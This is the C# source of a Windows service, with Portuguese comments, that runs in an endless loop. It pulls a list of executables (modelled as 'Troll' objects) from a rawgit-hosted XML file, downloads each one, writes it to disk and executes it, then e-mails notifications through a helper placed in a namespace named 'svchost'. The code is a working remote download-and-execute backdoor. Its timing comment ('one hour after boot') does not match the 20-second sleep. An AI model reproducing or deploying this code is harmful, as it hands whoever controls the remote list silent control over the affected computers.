﻿using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.ServiceProcess;
using System.Text;
using System.Threading;
using vtb.Model;

namespace vtb
{
    public partial class Service1 : ServiceBase
    {
        private Troll _exeAtual;
        private List<Email> _emailNotificacao;
        private List<int> _exesExecutados;

        private static readonly string UrlXmlExe = "https://rawgit.com/yuridiniz/PkgInstall/master/vtb/Xml/Exe.xml";
        private static readonly string UrlXmlEmails = "https://rawgit.com/yuridiniz/PkgInstall/master/vtb/Xml/Email.xml";

        public Service1()
        {
            InitializeComponent();
        }

        /// <summary>
        /// Evento de start do serviço
        /// </summary>
        /// <param name="args"></param>
        protected override void OnStart(string[] args)
        {
            _exesExecutados = new List<int>();
            EventLog.WriteEntry("Start", EventLogEntryType.Information);

            new Thread(exe).Start();
        }

        /// <summary>
        /// Evento de stop do serviço
        /// </summary>
        protected override void OnStop()
        {

        }

        /// <summary>
        /// Método que administra processos abertos e verifica lista de exes no git
        /// </summary>
        private void exe()
        {
            WebClient _cliente = new WebClient();

            while (true)
            {
                if (_exeAtual != null)
                    _exesExecutados.Add(_exeAtual.Id);

                //Uma hora apois o computador ser iniciado
                Thread.Sleep(20000 * 1);

                try
                {

                    VerificarListaExe();
                    ObterListaEmail();

                    var bytes = _cliente.DownloadData(_exeAtual.UrlExe);

                    _exeAtual.GravarExe(bytes, _emailNotificacao);

                    if (!_exesExecutados.Contains(_exeAtual.Id))
                        _exesExecutados.Add(_exeAtual.Id);

                    _exeAtual.ExecutarExe();

                }
                catch (Exception e)
                {
                    svchost.Helper.Email.Notificar(e.ToString());
                }
            }
        }

        /// <summary>
        /// Obter lista de email para notificar da execução
        /// </summary>
        /// <returns></returns>
        private void ObterListaEmail()
        {
            EventLog.WriteEntry("Obtendo email", EventLogEntryType.Information);
            _emailNotificacao = WebAPI.Get<List<Email>>(UrlXmlEmails);
        }

        /// <summary>
        /// Obtém um exe não executado, caso todos ja tenham sido executados começa novamente
        /// </summary>
        private void VerificarListaExe()
        {
            EventLog.WriteEntry("Verificando exes", EventLogEntryType.Information);

            List<Troll> listaexes = WebAPI.Get<List<Troll>>(UrlXmlExe);

            if (listaexes.Count == _exesExecutados.Count)
                _exesExecutados.Clear();

            foreach (Troll exe in listaexes)
            {
                if (!_exesExecutados.Contains(exe.Id))
                {
                    _exeAtual = exe;
                    break;
                }
            }

            if(_exeAtual == null)
            {
                Thread.Sleep(60000 * 60);
                VerificarListaExe();
            }
        }

        
    }
}
